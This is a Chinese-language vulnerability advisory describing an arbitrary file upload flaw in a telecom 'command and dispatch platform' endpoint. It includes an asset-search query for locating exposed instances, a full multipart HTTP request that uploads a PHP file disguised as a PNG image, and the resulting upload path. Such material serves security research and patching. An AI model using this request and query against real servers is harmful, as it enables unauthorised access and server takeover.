# 指挥调度平台client_upload存在任意文件上传漏洞

# 一、漏洞简介
<font style="color:rgb(51, 51, 51);">指挥调度管理平台是一个专业针对通信行业的管理平台。该产品旨在提供高效的指挥调度喝管理解决方案，以帮助通信运营商或相关机构实现更好的运营效率和服务质量。该平台提供强大的指挥调度功能，可以实时监控和管理通信网络设备、维护人员和工作任务等。用户可以通过该平台发送指令、调度人员、分配任务。</font>指挥调度平台client_upload存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 指挥调度平台

# 三、资产测绘
+ hunter`web.body="app/structure/departments.php"`
+ 特征

![1701096622884-9c34ec74-7f59-464c-b435-5a6ccd465c74.png](./img/4sD9krRQUS7aBGa8/1701096622884-9c34ec74-7f59-464c-b435-5a6ccd465c74-720140.png)

# 四、漏洞复现
```plain
POST /api/client/upload.php HTTP/1.1
Host: {hostname}
Content-Length: 180
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySwvD8hSn3Z0sHfMu
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundarySwvD8hSn3Z0sHfMu
Content-Disposition: form-data; name="ulfile";filename="1.php"
Content-Type: image/png

<?php echo 111*111;?>
------WebKitFormBoundarySwvD8hSn3Z0sHfMu--
```

![1704270269821-29e1c7ea-5a61-4f0e-a068-e4414af808be.png](./img/4sD9krRQUS7aBGa8/1704270269821-29e1c7ea-5a61-4f0e-a068-e4414af808be-125035.png)

上传文件位置

```plain
/upload/1.php
```

![1704270300936-e64326f0-0b9a-45c3-b5b2-a93fea878bcc.png](./img/4sD9krRQUS7aBGa8/1704270300936-e64326f0-0b9a-45c3-b5b2-a93fea878bcc-849516.png)



> 更新: 2024-02-29 23:55:44  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cqbzid7u7knls8bl>